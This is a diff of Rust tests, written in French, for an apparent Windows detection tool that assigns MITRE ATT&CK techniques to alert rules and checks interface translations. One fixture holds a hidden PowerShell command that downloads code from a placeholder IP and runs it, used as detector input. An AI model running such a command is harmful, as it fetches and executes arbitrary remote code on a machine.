@@ -4083,11 +4083,12 @@ fn phase3_bornage_garde_la_conclusion() {
     use crate::commun::{borner_alerte, Alerte};
     let commande = format!("powershell.exe{}-w hidden -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')", " ".repeat(1100));
     let remarque = crate::processus::suspicion(&commande).expect("motif PowerShell");
-    let mut a = Alerte { niveau: "Alerte".into(), score: 3, raisons: format!("NOUVEAU démarrage automatique : {commande} [{remarque}]"), ..Default::default() };
+    let mut a = Alerte { regle: "PER-001".into(), niveau: "Alerte".into(), score: 3, raisons: format!("NOUVEAU démarrage automatique : {commande} [{remarque}]"), ..Default::default() };
     crate::mitre::enrichir(&mut a);
     assert!(crate::apprentissage::signal_fort(&a), "témoin : signal fort sur le texte entier");
+    // Couverture ATT&CK, lot 2 : la technique vient de la règle (PER-001), plus des mots du texte
     let mitre = a.mitre.clone();
-    assert!(mitre.contains("T1059.001"), "témoin : technique PowerShell ({mitre})");
+    assert!(mitre.contains("T1547.001"), "témoin : technique de la persistance ({mitre})");
     borner_alerte(&mut a);
     assert!(a.raisons.contains(remarque), "remarque coupée par le bornage : {}", a.raisons);
     assert_eq!(a.mitre, mitre);
@@ -6710,23 +6711,26 @@ fn dossiers_de_test() -> crate::vol_donnees::DossiersFermes {
 
 #[test]
 fn textes_du_service_traduits_dans_l_interface_lot1() {
-    // Revue de l'auditeur du 2026-11-21, point 3 (premier lot) : techniques et conseils de mitre.rs traduits par la table
-    // de l'interface (un texte Rust retouché sans sa traduction fait échouer ce test, jamais l'affichage en silence) ;
-    // identifiants de collecte jamais affichés bruts ; plus de « clic droit » ; Sysmon facultatif hors du bandeau
+    // Revue de l'auditeur du 2026-11-21, point 3 (premier lot) : conseils et noms des techniques de mitre.rs traduits par
+    // la table de l'interface (un texte Rust retouché sans sa traduction fait échouer ce test, jamais l'affichage en
+    // silence) ; identifiants de collecte jamais affichés bruts ; plus de « clic droit » ; Sysmon facultatif hors du bandeau
     let m = include_str!("mitre.rs");
     let langue = include_str!("../../src/Langue.cs");
-    let re = regex::Regex::new(r#"\(&\[[^\]]*\],\s*"((?:[^"\\]|\\.)*)",\s*"((?:[^"\\]|\\.)*)"\)"#).unwrap();
+    // Même échappement côté C# : guillemet et barre oblique inverse
+    let traduit = |fr: &str| langue.contains(&format!("{{ \"{}\", \"", fr.replace('\\', "\\\\").replace('"', "\\\"")));
+    let re = regex::Regex::new(r#"\(&\[[^\]]*\],\s*"((?:[^"\\]|\\.)*)"\)"#).unwrap();
     let mut n = 0;
     for c in re.captures_iter(m) {
-        for i in [1, 2] {
-            let fr = c[i].replace("\\\\", "\\");
-            // Même échappement côté C# : guillemet et barre oblique inverse
-            let cle = format!("{{ \"{}\", \"", fr.replace('\\', "\\\\").replace('"', "\\\""));
-            assert!(langue.contains(&cle), "sans traduction dans Langue.cs : {fr}");
-        }
+        let fr = c[1].replace("\\\\", "\\");
+        assert!(traduit(&fr), "conseil sans traduction dans Langue.cs : {fr}");
         n += 1;
     }
-    assert!(n >= 28, "règles de mitre.rs lues : {n}");
+    assert!(n >= 28, "conseils de mitre.rs lus : {n}");
+    // Couverture ATT&CK, lot 2 : chaque technique nommée a sa traduction, libellé par libellé (L.Mitre)
+    for (id, _) in crate::mitre::NOMS {
+        let l = crate::mitre::libelle(id);
+        assert!(traduit(&l), "technique sans traduction dans Langue.cs : {l}");
+    }
     assert!(!m.contains("clic droit") && !m.contains("onglet "), "conseils de l'ancienne interface");
     // Clés en double : le dictionnaire de l'interface lèverait une exception au démarrage
     let cles = regex::Regex::new(r#"\{ "((?:[^"\\]|\\.)*)", ""#).unwrap();
@@ -6742,9 +6746,9 @@ fn textes_du_service_traduits_dans_l_interface_lot1() {
         assert!(noms.contains(&format!("{{ \"{}\", \"", c.id())), "collecte sans nom lisible : {}", c.id());
     }
     let f = include_str!("../../src/Fluent.cs");
-    assert!(f.contains("Couverture.Nom(a.Collecte)") && f.contains("L.T(a.Mitre)") && f.contains("L.T(a.Conseil)"));
+    assert!(f.contains("Couverture.Nom(a.Collecte)") && f.contains("L.Mitre(a.Mitre)") && f.contains("L.T(a.Conseil)"));
     let g = include_str!("../../src/Gui.cs");
-    assert!(g.contains("Couverture.Nom(a.Collecte)") && g.contains("L.T(a.Mitre)") && g.contains("L.T(a.Conseil)"));
+    assert!(g.contains("Couverture.Nom(a.Collecte)") && g.contains("L.Mitre(a.Mitre)") && g.contains("L.T(a.Conseil)"));
     assert!(include_str!("../../src/Incidents.cs").contains("Sujet = v(Couverture.Nom(c.Id))"));
     assert!(commun.contains("Decrire(EtatCollecte c)") && commun.contains("return Nom(c.Id) + \" \" + etat"));
     // Sysmon facultatif : ligne neutre avec la vraie conséquence (WMI partiel, PRC-001 à PRC-005 dégradées), jamais
@@ -8486,12 +8490,114 @@ fn mitre_micro_pas_microsoft() {
         destination: "mobile.events.data.microsoft.com".into(), ..Default::default() };
     crate::mitre::enrichir(&mut a);
     assert!(!a.mitre.contains("T1123"), "{}", a.mitre);
-    let mut v = Alerte { regle: "VIE-001".into(), raisons: "Zoom utilise le micro pour la première fois".into(), destination: "Micro".into(), ..Default::default() };
+    // VIE-001 : la technique est posée par le code qui produit l'alerte (surveillances.rs), plus par les mots du texte
+    let mut v = Alerte { regle: "VIE-001".into(), raisons: "Zoom utilise le micro pour la première fois".into(), destination: "Micro".into(), mitre: "T1123".into(), ..Default::default() };
     crate::mitre::enrichir(&mut v);
     assert_eq!(v.mitre, "T1123 Capture audio");
-    let mut c = Alerte { regle: "VIE-001".into(), raisons: "Zoom utilise la caméra pour la première fois".into(), destination: "Caméra".into(), ..Default::default() };
+    let mut c = Alerte { regle: "VIE-001".into(), raisons: "Zoom utilise la caméra pour la première fois".into(), destination: "Caméra".into(), mitre: "T1125".into(), ..Default::default() };
     crate::mitre::enrichir(&mut c);
     assert_eq!(c.mitre, "T1125 Capture vidéo");
+}
+
+// ------------------------------------------------------------ couverture ATT&CK, lot 2 : la technique vient de la règle
+
+/// Chaque règle du registre a sa technique dans la table (liste fixe, posée par l'alerte, ou « aucune » dite) ; chaque
+/// identifiant a une forme ATT&CK et un nom ; seules les règles à plusieurs comportements laissent leur code la poser
+#[test]
+fn attack_lot2_table_des_techniques_complete() {
+    use crate::regles::{Techniques, REGLES};
+    let mut par_l_alerte = Vec::new();
+    for r in REGLES {
+        match r.techniques {
+            Techniques::Fixes(t) => {
+                assert!(!t.is_empty(), "{} : liste fixe vide (écrire Aucune)", r.id);
+                for id in t {
+                    assert_eq!(crate::mitre::identifiants_du_texte(id), vec![id.to_string()], "{} : identifiant mal formé {id}", r.id);
+                    assert_ne!(crate::mitre::libelle(id), *id, "{} : technique {id} sans nom dans mitre::NOMS", r.id);
+                    // ATT&CK v20 : ces identifiants ont été déplacés (docs/validation/carte-attack.md)
+                    assert!(!["T1562.001", "T1562.002", "T1562.004", "T1070.001", "T1176"].contains(id), "{} : identifiant d'avant v20 {id}", r.id);
+                }
+            }
+            Techniques::ParLAlerte => par_l_alerte.push(r.id),
+            Techniques::Aucune => {}
+        }
+    }
+    par_l_alerte.sort();
+    assert_eq!(par_l_alerte, ["CHA-001", "COR-R7", "EXP-DPI-001", "EXP-IDS-001", "EXP-NDR-001", "VIE-001"]);
+    // Toute technique posée par le code (identifiants littéraux) a un nom
+    for (nom, source) in [("dpi", include_str!("dpi.rs")), ("ndr", include_str!("ndr.rs")), ("siem", include_str!("siem.rs")),
+                          ("parefeu", include_str!("parefeu.rs")), ("surveillances", include_str!("surveillances.rs"))] {
+        for id in regex::Regex::new(r#""(T1[0-9]{3}(?:\.[0-9]{3})?)""#).unwrap().captures_iter(source) {
+            assert_ne!(crate::mitre::libelle(&id[1]), &id[1], "{nom} : technique {} sans nom", &id[1]);
+        }
+    }
+}
+
+/// Plus aucune recherche de mots pour la technique : le texte de l'alerte ne la change pas, la règle si
+#[test]
+fn attack_lot2_technique_par_regle_et_non_par_mots() {
+    use crate::commun::Alerte;
+    let m = include_str!("mitre.rs");
+    let conseils = &m[m.find("const CONSEILS").expect("table des conseils")..];
+    assert!(!regex::Regex::new(r#""T1[0-9]{3}"#).unwrap().is_match(conseils), "technique restée dans la table des mots-clés");
+    // « leurre » dans le texte d'une règle de santé : aucune technique (avant : T1486 par le mot)
+    let mut a = Alerte { regle: "SAN-001".into(), raisons: "collecte Leurres indisponible : leurre non posé".into(), ..Default::default() };
+    crate::mitre::enrichir(&mut a);
+    assert_eq!(a.mitre, "");
+    // LEU-001 sans le mot « leurre » : T1486 quand même
+    let mut b = Alerte { regle: "LEU-001".into(), raisons: "fichier modifié".into(), ..Default::default() };
+    crate::mitre::enrichir(&mut b);
+    assert_eq!(b.mitre, "T1486 Chiffrement de données (rançongiciel)");
+    // Plusieurs techniques : libellés séparés par « / » ; règle posée par l'alerte : identifiants du code
+    let mut c = Alerte { regle: "PRC-002".into(), ..Default::default() };
+    crate::mitre::enrichir(&mut c);
+    assert_eq!(c.mitre, "T1059.001 PowerShell / T1027 Code obscurci");
+    let mut d = Alerte { regle: "EXP-NDR-001".into(), mitre: "T1557.002".into(), raisons: "usurpation ARP  [MITRE T1557.002]".into(), ..Default::default() };
+    crate::mitre::enrichir(&mut d);
+    assert_eq!(d.mitre, "T1557.002 Usurpation ARP");
+    // Corrélation : la technique de l'incident vient de la table (COR-R4 : T1685.005, ancien T1070.001)
+    assert_eq!(crate::mitre::identifiants_de_regle("COR-R4", "T1070.001"), ["T1685.005"]);
+    assert_eq!(crate::mitre::identifiants_de_regle("COR-R7", "T1685.001"), ["T1685.001"], "COR-R7 : technique de l'événement");
+}
+
+/// Empreinte des exceptions : la règle et les identifiants de techniques, jamais le libellé (un renommage ou une
+/// traduction ne rend plus une exception caduque)
+#[test]
+fn attack_lot2_empreinte_sur_les_identifiants() {
+    use crate::apprentissage::signature_avec;
+    use crate::commun::Alerte;
+    let a = Alerte { regle: "PRC-002".into(), chemin: r"C:\x\p.exe".into(), mitre: "T1059.001 PowerShell / T1027 Code obscurci".into(), ..Default::default() };
+    let b = Alerte { mitre: "T1059.001 PowerShell (renamed) / T1027 Obfuscated".into(), ..a.clone() };
+    assert_eq!(signature_avec(&a, "e"), signature_avec(&b, "e"));
+    let c = Alerte { regle: "PRC-003".into(), ..a.clone() };
+    assert_ne!(signature_avec(&a, "e"), signature_avec(&c, "e"), "autre règle, autre comportement");
+}
+
+/// Une chaîne PowerShell puis un outil Windows détourné ne reçoit plus T1204 par défaut : elle porte les techniques de
+/// ses signaux
+#[test]
+fn attack_lot2_chaine_porte_les_techniques_de_ses_signaux() {
+    use crate::natif::InfoListe;
+    let mut arbre = crate::chaines::Arbre::default();
+    let liste: std::collections::HashMap<u32, InfoListe> = [(100, ("explorer", 4)), (200, ("powershell", 100)), (300, ("cmd", 200))]
+        .into_iter().map(|(pid, (nom, parent))| (pid, InfoListe { nom: nom.into(), parent })).collect();
+    arbre.maj(&liste);
+    arbre.signaler_avec(200, 5, "PowerShell obscurci ou qui télécharge du code", &crate::mitre::identifiants_de_regle("PRC-002", ""));
+    arbre.signaler_avec(300, 7, "détournement d'outil Windows (LOLBin)", &["T1218".to_string()]);
+    let mut a = arbre.alertes(&arbre.chaines());
+    assert_eq!(a.len(), 1);
+    assert_eq!(a[0].mitre, "T1059.001 / T1027 / T1218");
+    crate::mitre::enrichir(&mut a[0]);
+    assert!(!a[0].mitre.contains("T1204"), "{}", a[0].mitre);
+    assert_eq!(a[0].mitre, "T1059.001 PowerShell / T1027 Code obscurci / T1218 Binaire système détourné");
+    // Signaux sans technique : la chaîne n'en invente pas
+    let mut b = crate::chaines::Arbre::default();
+    b.maj(&liste);
+    b.signaler(200, 6, "indice");
+    b.signaler(300, 6, "autre indice");
+    let mut c = b.alertes(&b.chaines());
+    crate::mitre::enrichir(&mut c[0]);
+    assert_eq!(c[0].mitre, "");
 }
 
 // ------------------------------------------------------------ audit du 2026-11-14, lot 1 (frontière du dossier de données)
